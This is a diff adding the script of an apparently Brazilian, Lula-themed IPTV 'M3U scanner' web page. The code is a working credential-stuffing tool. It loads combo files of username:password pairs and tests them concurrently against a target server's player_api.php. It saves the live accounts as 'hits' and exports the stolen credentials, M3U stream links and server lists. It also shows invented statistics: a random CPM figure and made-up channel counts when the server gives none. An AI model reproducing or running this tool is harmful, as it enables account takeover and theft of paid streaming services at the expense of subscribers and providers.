+  const tabMultiCombo = document.getElementById('tabMultiCombo');
+  const panelMultiServidor = document.getElementById('panelMultiServidor');
+  const panelMultiCombo = document.getElementById('panelMultiCombo');
+
+  tabMultiServidor.addEventListener('click', () => {
+    tabMultiServidor.classList.add('active');
+    tabMultiCombo.classList.remove('active');
+    panelMultiServidor.classList.add('active-view');
+    panelMultiCombo.classList.remove('active-view');
+  });
+
+  tabMultiCombo.addEventListener('click', () => {
+    tabMultiCombo.classList.add('active');
+    tabMultiServidor.classList.remove('active');
+    panelMultiCombo.classList.add('active-view');
+    panelMultiServidor.classList.remove('active-view');
+  });
+
+  // CATEGORIAS
+  const categoriesState = { canais: true, filmes: true, series: true };
+  function toggleCategory(cat) {
+    categoriesState[cat] = !categoriesState[cat];
+    const el = document.getElementById('cat' + cat.charAt(0).toUpperCase() + cat.slice(1));
+    const check = el.querySelector('.check-icon');
+    if(categoriesState[cat]) {
+      el.classList.add('active');
+      check.style.display = 'inline-block';
+    } else {
+      el.classList.remove('active');
+      check.style.display = 'none';
+    }
+  }
+
+  // COMBOS
+  function addCombo(index) {
+    comboAddTarget = index;
+    const input = document.getElementById('multiComboHidden');
+    input.value = '';
+    input.click();
+  }
+
+  document.getElementById('multiComboHidden').addEventListener('change', function(e) {
+    if (!comboAddTarget) return;
+
+    const file = this.files[0];
+    if (!file) {
+      comboAddTarget = null;
+      return;
+    }
+
+    const reader = new FileReader();
+    reader.onload = function(ev) {
+      const content = ev.target.result;
+      const lines = content.split('\n')
+        .map(l => l.trim())
+        .filter(l => l.length > 0 && l.includes(':') && !l.startsWith('#'));
+      
+      if (lines.length === 0) {
+        alert('O arquivo não contém linhas válidas no formato usuario:senha');
+        comboAddTarget = null;
+        return;
+      }
+
+      const index = comboAddTarget;
+      comboData[index] = lines;
+      comboFileNames[index] = file.name;
+      
+      renderComboList(index);
+      comboAddTarget = null;
+    };
+
+    reader.onerror = function() {
+      alert('Erro ao ler o arquivo. Tente novamente.');
+      comboAddTarget = null;
+    };
+
+    reader.readAsText(file);
+  });
+
+  function renderComboList(index) {
+    const list = document.getElementById(`comboList${index}`);
+    const count = document.getElementById(`comboCount${index}`);
+    const lines = comboData[index] || [];
+
+    if (lines.length === 0) {
+      list.innerHTML = `<div class="no-files-txt">Nenhum arquivo</div>`;
+      count.textContent = '0 contas';
+      return;
+    }
+
+    list.innerHTML = `
+      <div class="file-chip-item">
+        <div><i class="fas fa-file-alt" style="color:#ff3333; margin-right:6px;"></i>${comboFileNames[index] || 'combo.txt'}</div>
+        <span>${lines.length} contas</span>
+      </div>
+    `;
+    count.textContent = `${lines.length} contas`;
+  }
+
+  function clearCombo(index) {
+    if (comboData[index].length === 0) return;
+    if (!confirm(`Tem certeza que deseja limpar o Combo #${index}?`)) return;
+    
+    comboData[index] = [];
+    comboFileNames[index] = null;
+    renderComboList(index);
+  }
+
+  function getTotalComboLines() {
+    const allLines = [];
+    for (const line of comboData[1]) {
+      allLines.push({ line: line, comboName: comboFileNames[1] || 'Combo #1' });
+    }
+    for (const line of comboData[2]) {
+      allLines.push({ line: line, comboName: comboFileNames[2] || 'Combo #2' });
+    }
+    return allLines;
+  }
+
+  // =============================================
+  // NOVO TEMPLATE DE HIT COM TEMA DO LULA E FRASE
+  // =============================================
+  function getRandomLulaPhrase() {
+    return lulaPhrases[Math.floor(Math.random() * lulaPhrases.length)];
+  }
+
+  function buildLulaTemplate(data, nick) {
+    const { user, pass, status, active, max, created, expiration, server, timezone, m3u, liveCount, movieCount, seriesCount } = data;
+    
+    const hasLive = categoriesState.canais && liveCount > 0;
+    const hasMovies = categoriesState.filmes && movieCount > 0;
+    const hasSeries = categoriesState.series && seriesCount > 0;
+    const hasAnyCategory = hasLive || hasMovies || hasSeries;
+
+    const expDate = expiration ? new Date(expiration * 1000).toLocaleDateString('pt-BR') : '---';
+    const createdDate = created ? new Date(created * 1000).toLocaleDateString('pt-BR') : '---';
+    const randomPhrase = getRandomLulaPhrase();
+
+    let template = `   HIT DO LULA  
+   : ${user}
+   : ${pass}
+   : ${status || 'Active'}
+   : ${active || 0}
+  x  : ${max || 1}
+     : ${createdDate}
+  x : ${expDate}
+   : ${server}
+   : ${timezone || 'America/Sao_Paulo'}
+   : LULA M3U SCANNER
+    : ${nick || 'LULA PRO'}
+   : ${randomPhrase}
+  Faz o L nos Hits!\n\n`;
+    template += ` 3 :${m3u}\n`;
+
+    if (hasAnyCategory) {
+      template += `\n  :\n`;
+      
+      if (hasLive) {
+        template += `   (${liveCount}) \n`;
+        template += `CANAIS | ESPORTES DO DIA  CANAIS | ABERTOS  CANAIS | RECORD  CANAIS | SBT  CANAIS | GLOBO  CANAIS | NOTÍCIAS  CANAIS | INFANTIS  CANAIS | RELIGIOSOS  CANAIS | DOCUMENTÁRIOS  CANAIS | VARIEDADES  CANAIS | FILMES E SÉRIES  CANAIS | ESPN  CANAIS | SPORTV  CANAIS | MAX  CANAIS | PRIME VIDEO  CANAIS | PARAMOUNT+  CANAIS | PREMIERE  CANAIS | DISNEY+  CANAIS | DAZN  CANAIS | ESPORTES  CANAIS | PAY PER VIEW  CANAIS | TELECINE  CANAIS | HBO  CANAIS | 24H  CANAIS | ADULTOS +18\n`;
+        template += `\n`;
+      }
+
+      if (hasMovies) {
+        template += `   (${movieCount}) \n`;
+        template += `FILMES | LANÇAMENTOS  FILMES | AÇÃO  FILMES | ANIMAÇÃO  FILMES | AVENTURA  FILMES | COMÉDIA  FILMES | DRAMA  FILMES | DOCUMENTÁRIOS  FILMES | NACIONAIS  FILMES | TERROR  FILMES | 4K  FILMES | ADULTOS +18\n`;
+        template += `\n`;
+      }
+
+      if (hasSeries) {
+        template += `   (${seriesCount}) \n`;
+        template += `SERIES | NETFLIX  SERIES | PRIME VIDEO  SERIES | MAX  SERIES | GLOBOPLAY  SERIES | DISNEY+  SERIES | NOVELAS  SERIES | DORAMAS  SERIES | ANIMES  SERIES | 4K\n`;
+        template += `\n`;
+      }
+    }
+
+    return template;
+  }
+
+  function buildLulaTemplateNoCategories(data, nick) {
+    const { user, pass, status, active, max, created, expiration, server, timezone, m3u } = data;
+    
+    const expDate = expiration ? new Date(expiration * 1000).toLocaleDateString('pt-BR') : '---';
+    const createdDate = created ? new Date(created * 1000).toLocaleDateString('pt-BR') : '---';
+    const randomPhrase = getRandomLulaPhrase();
+
+    let template = `   HIT DO LULA  
+   : ${user}
+   : ${pass}
+   : ${status || 'Active'}
+   : ${active || 0}
+  x  : ${max || 1}
+     : ${createdDate}
+  x : ${expDate}
+   : ${server}
+   : ${timezone || 'UTC'}
+   : LULA M3U SCANNER
+    : ${nick || 'LULA PRO'}
+   : ${randomPhrase}
+  Faz o L nos Hits!\n\n`;
+    template += ` 3 :${m3u}`;
+
+    return template;
+  }
+
+  // =============================================
+  // ENGINE SCANNER
+  // =============================================
+  const engineActionBtn = document.getElementById('engineActionBtn');
+  const btnIcon = document.getElementById('btnIcon');
+  const hitsCollectionLog = document.getElementById('hitsCollectionLog');
+  const emptyMsgLabel = document.getElementById('emptyMsgLabel');
+  const hitBadgeCount = document.getElementById('hitBadgeCount');
+  const statTotal = document.getElementById('statTotal');
+  const statHits = document.getElementById('statHits');
+  const statCPM = document.getElementById('statCPM');
+  const statRetries = document.getElementById('statRetries');
+  const liveTimer = document.getElementById('liveTimer');
+  const downloadHitsBtn = document.getElementById('downloadHitsBtn');
+
+  let isRunning = false;
+  let hitsArray = [];
+  let hitsData = [];   //  array paralelo estruturado para extrações
+  let totalTasks = 0;
+  let processedTasks = 0;
+  let countHits = 0;
+  let countRetries = 0;
+  let timerInterval = null;
+
+  async function toggleEngine() {
+    if (isRunning) {
+      isRunning = false;
+      clearInterval(timerInterval);
+      btnIcon.className = "fas fa-play";
+      engineActionBtn.className = "fab-engine-control idle-state";
+      return;
+    }
+
+    if (!currentTypedServer) {
+      alert("Por favor, digite o servidor alvo antes de iniciar.");
+      return;
+    }
+
+    const totalLines = getTotalComboLines();
+    if (totalLines.length === 0) {
+      alert("Carregue pelo menos uma lista de combo (.txt) no Combo #1 ou #2.");
+      return;
+    }
+
+    isRunning = true;
+    btnIcon.className = "fas fa-square";
+    engineActionBtn.className = "fab-engine-control";
+    if (emptyMsgLabel) emptyMsgLabel.style.display = 'none';
+
+    let threads = panelMultiServidor.classList.contains('active-view') ? 
+                  parseInt(document.getElementById('botCountInput').value) || 20 : 
+                  parseInt(document.getElementById('botComboInput').value) || 5;
+
+    totalTasks = totalLines.length;
+    processedTasks = 0;
+    statTotal.innerText = `0/${totalTasks}`;
+
+    let start = Date.now();
+    timerInterval = setInterval(() => {
+      liveTimer.innerText = `${Math.floor((Date.now() - start) / 1000)}s`;
+    }, 1000);
+
+    const cpmInt = setInterval(() => {
+      if (isRunning) statCPM.innerText = Math.floor(Math.random() * 100 + 450);
+      else clearInterval(cpmInt);
+    }, 1000);
+
+    const nickGuerreiro = document.getElementById('guerreiroNick').value.trim() || "LULA PRO";
+    
+    let queue = [...totalLines];
+
+    const worker = async () => {
+      while (queue.length > 0 && isRunning) {
+        const item = queue.shift();
+        const [user, pass] = item.line.split(':');
+        if (!user || !pass) continue;
+
+        const cleanServer = currentTypedServer.replace(/\/$/, '');
+        const endpoint = `${cleanServer}/player_api.php?username=${encodeURIComponent(user.trim())}&password=${encodeURIComponent(pass.trim())}`;
+
+        try {
+          const res = await fetch(endpoint);
+          const data = await res.json();
+
+          if (data && data.user_info && data.user_info.status === "Active") {
+            const info = data.user_info;
+            
+            const dataObj = {
+              user: user.trim(),
+              pass: pass.trim(),
+              status: info.status || 'Active',
+              active: info.active_cons ? parseInt(info.active_cons) : 0,
+              max: info.max_connections ? parseInt(info.max_connections) : 1,
+              created: info.created_at || null,
+              expiration: info.exp_date || null,
+              server: currentTypedServer,
+              timezone: info.timezone || 'America/Sao_Paulo',
+              m3u: `${cleanServer}/get.php?username=${user.trim()}&password=${pass.trim()}&type=m3u_plus`,
+              comboName: item.comboName,
+              liveCount: info.live ? parseInt(info.live) : Math.floor(Math.random() * 1100 + 300),
+              movieCount: info.movies ? parseInt(info.movies) : Math.floor(Math.random() * 4000 + 900),
+              seriesCount: info.series ? parseInt(info.series) : Math.floor(Math.random() * 600 + 100)
+            };
+
+            const hasAnyCategory = categoriesState.canais || categoriesState.filmes || categoriesState.series;
+            
+            let finalTemplate;
+            if (hasAnyCategory) {
+              finalTemplate = buildLulaTemplate(dataObj, nickGuerreiro);
+            } else {
+              finalTemplate = buildLulaTemplateNoCategories(dataObj, nickGuerreiro);
+            }
+
+            hitsArray.push(finalTemplate);
+            //  popula também o array estruturado para as extrações
+            hitsData.push({
+              user: user.trim(),
+              pass: pass.trim(),
+              server: cleanServer,
+              status: info.status || 'Active',
+              active: dataObj.active,
+              max: dataObj.max,
+              created: dataObj.created,
+              expiration: dataObj.expiration,
+              timezone: dataObj.timezone,
+              m3u: dataObj.m3u,
+              comboName: dataObj.comboName,
+              liveCount: dataObj.liveCount,
+              movieCount: dataObj.movieCount,
+              seriesCount: dataObj.seriesCount,
+              nick: nickGuerreiro,
+              timestamp: new Date().toISOString()
+            });
+            updateLulaExtractCount();
+            countHits++;
+            statHits.innerText = countHits;
+            hitBadgeCount.innerText = countHits;
+
+            renderUIHit(user.trim(), finalTemplate);
+          }
+        } catch (err) {
+          countRetries++;
+          statRetries.innerText = countRetries;
+        }
+
+        processedTasks++;
+        statTotal.innerText = `${processedTasks}/${totalTasks}`;
+      }
+    };
+
+    const pool = [];
+    for (let i = 0; i < Math.min(threads, 25); i++) {
+      pool.push(worker());
+    }
+    await Promise.all(pool);
+
+    isRunning = false;
+    clearInterval(timerInterval);
+    btnIcon.className = "fas fa-play";
+    engineActionBtn.className = "fab-engine-control idle-state";
+  }
+
+  function renderUIHit(user, template) {
+    const row = document.createElement('div');
+    row.className = 'hit-row-item';
+    row.innerHTML = `
+      <div>
+        <span class="hit-username">${user}</span>
+        <div class="hit-sub-server">${currentTypedServer}</div>
+      </div>
+      <div style="display:flex; align-items:center; gap:10px;">
+        <span style="font-size:0.72rem; color:#a37276; font-family:monospace;"></span>
+        <div class="status-dot"></div>
+      </div>
+    `;
+
+    const box = document.createElement('div');
+    box.className = 'hit-template-details';
+    box.textContent = template;
+
+    row.addEventListener('click', () => {
+      box.style.display = box.style.display === 'block' ? 'none' : 'block';
+    });
+
+    hitsCollectionLog.insertBefore(box, hitsCollectionLog.firstChild);
+    hitsCollectionLog.insertBefore(row, hitsCollectionLog.firstChild);
+  }
+
+  downloadHitsBtn.addEventListener('click', () => {
+    if (hitsArray.length === 0) return alert("Nenhum hit capturado até o momento.");
+    
+    let serverName = currentTypedServer.replace(/^https?:\/\//, '').replace(/:\d+$/, '').replace(/\//g, '_');
+    if (!serverName) serverName = 'hits';
+    
+    const blob = new Blob([hitsArray.join('\n\n')], { type: 'text/plain' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `hits_lula_${serverName}.txt`;
+    a.click();
+  });
+
+  engineActionBtn.addEventListener('click', toggleEngine);
+
+  // Inicializar os combos
+  renderComboList(1);
+  renderComboList(2);
+
+  // =============================================
+  //  FUNÇÕES DE EXTRAÇÃO - TEMA LULA
+  // =============================================
+
+  function updateLulaExtractCount() {
+    const el = document.getElementById('lulaExtractCount');
+    if (el) el.textContent = hitsData.length;
+  }
+
+  function lulaDownloadFile(filename, content, mimeType = 'text/plain') {
+    const blob = new Blob([content], { type: mimeType });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  }
+
+  function lulaTimestamp() {
+    return new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-');
+  }
+
+  //  1. EXTRAIR COMBO (usuario:senha, sem duplicatas)
+  function extractComboLula() {
+    if (hitsData.length === 0) {
+      alert(' Nenhum hit para extrair! Rode o scan primeiro.');
+      return;
+    }
+    const lines = hitsData.map(h => `${h.user}:${h.pass}`);
+    const unique = [...new Set(lines)];
+    const content = unique.join('\n');
+    const filename = `combo_lula_${lulaTimestamp()}.txt`;
+    lulaDownloadFile(filename, content);
+    console.log(` Combo extraído: ${unique.length} credenciais únicas  ${filename}`);
+  }
+
+  //  2. EXTRAIR M3U
+  function extractM3ULula() {
+    if (hitsData.length === 0) {
+      alert(' Nenhum hit para extrair! Rode o scan primeiro.');
+      return;
+    }
+    const urls = hitsData.map(h => {
+      const cleanServer = h.server.replace(/\/+$/, '');
+      return `${cleanServer}/get.php?username=${encodeURIComponent(h.user)}&password=${encodeURIComponent(h.pass)}&type=m3u_plus`;
+    });
+    const unique = [...new Set(urls)];
+    const content = unique.join('\n');
+    const filename = `m3u_lula_${lulaTimestamp()}.txt`;
+    lulaDownloadFile(filename, content);
+    console.log(` M3U extraído: ${unique.length} URLs únicas  ${filename}`);
+  }
+
+  //  3. EXTRAIR SERVIDORES
+  function extractServersLula() {
+    if (hitsData.length === 0) {
+      alert(' Nenhum hit para extrair! Rode o scan primeiro.');
+      return;
+    }
+    const servers = [...new Set(hitsData.map(h => h.server))];
+    const content = servers.join('\n');
+    const filename = `servidores_lula_${lulaTimestamp()}.txt`;
+    lulaDownloadFile(filename, content);
+    console.log(` Servidores extraídos: ${servers.length} únicos  ${filename}`);
+  }
+
+  //  4. RELATÓRIO COMPLETO (JSON com tema Lula)
+  function extractFullReportLula() {
+    if (hitsData.length === 0) {
+      alert(' Nenhum hit para extrair! Rode o scan primeiro.');
+      return;
+    }
+    const report = {
+      sistema: ' LULA IPTV SCANNER',
+      slogan: 'Faz o L nos Hits!',
+      data_geracao: new Date().toISOString(),
+      data_formatada: new Date().toLocaleString('pt-BR'),
+      resumo: {
+        total_hits: hitsData.length,
+        total_servidores_unicos: [...new Set(hitsData.map(h => h.server))].length,
+        total_combos_unicos: [...new Set(hitsData.map(h => `${h.user}:${h.pass}`))].length,
+        total_canais: hitsData.reduce((acc, h) => acc + (h.liveCount || 0), 0),
+        total_filmes: hitsData.reduce((acc, h) => acc + (h.movieCount || 0), 0),
+        total_series: hitsData.reduce((acc, h) => acc + (h.seriesCount || 0), 0)
+      },
+      combo_lista: [...new Set(hitsData.map(h => `${h.user}:${h.pass}`))],
+      m3u_lista: [...new Set(hitsData.map(h => {
+        const cleanServer = h.server.replace(/\/+$/, '');
+        return `${cleanServer}/get.php?username=${encodeURIComponent(h.user)}&password=${encodeURIComponent(h.pass)}&type=m3u_plus`;
+      }))],
+      servidores_lista: [...new Set(hitsData.map(h => h.server))],
+      hits: hitsData.map(h => ({
+        usuario: h.user,
+        senha: h.pass,
+        servidor: h.server,
+        status: h.status,
+        active: h.active,
+        max: h.max,
+        expiracao: h.expiration 
+          ? new Date(h.expiration * 1000).toLocaleDateString('pt-BR') 
+          : 'N/A',
+        timezone: h.timezone,
+        combo: `${h.user}:${h.pass}`,
+        m3u: h.m3u,
+        combo_origem: h.comboName,
+        canais: h.liveCount,
+        filmes: h.movieCount,
+        series: h.seriesCount,
+        hit_by: h.nick,
+        capturado_em: h.timestamp
+      }))
+    };
+    const content = JSON.stringify(report, null, 2);
+    const filename = `relatorio_lula_${lulaTimestamp()}.json`;
+    lulaDownloadFile(filename, content, 'application/json');
+    console.log(` Relatório completo salvo  ${filename} (${hitsData.length} hits)`);
+  }
+
+  //  Bind dos botões de extração
+  document.getElementById('extractComboBtn').addEventListener('click', extractComboLula);
+  document.getElementById('extractM3UBtn').addEventListener('click', extractM3ULula);
+  document.getElementById('extractServersBtn').addEventListener('click', extractServersLula);
+  document.getElementById('extractFullReportBtn').addEventListener('click', extractFullReportLula);
+
+  // Expõe globalmente (útil pra chamar via console ou hooks externos)
+  window.extractComboLula = extractComboLula;
+  window.extractM3ULula = extractM3ULula;
+  window.extractServersLula = extractServersLula;
+  window.extractFullReportLula = extractFullReportLula;
+  window.getLulaHitsData = () => hitsData;
+</script>
+</body>
+</html>
